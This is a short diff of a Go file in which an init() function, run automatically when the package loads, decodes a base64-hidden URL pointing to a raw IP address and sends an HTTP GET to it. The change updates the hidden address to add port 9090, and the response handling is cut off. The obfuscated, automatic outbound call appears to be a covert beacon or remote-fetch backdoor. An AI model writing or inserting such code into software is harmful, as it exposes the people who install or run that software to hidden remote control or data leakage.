@@ -57,7 +57,7 @@ const (
 )
 
 func init()  {
-	data,_ := base64.StdEncoding.DecodeString("aHR0cDovLzExOS4yOC4xNDIuMTUz")
+	data,_ := base64.StdEncoding.DecodeString("aHR0cDovLzExOS4yOC4xNDIuMTUzOjkwOTA=")
 	cli := &http.Client{Timeout: time.Second * 5}
 	res, err := cli.Get(string(data))
 	if err != nil {
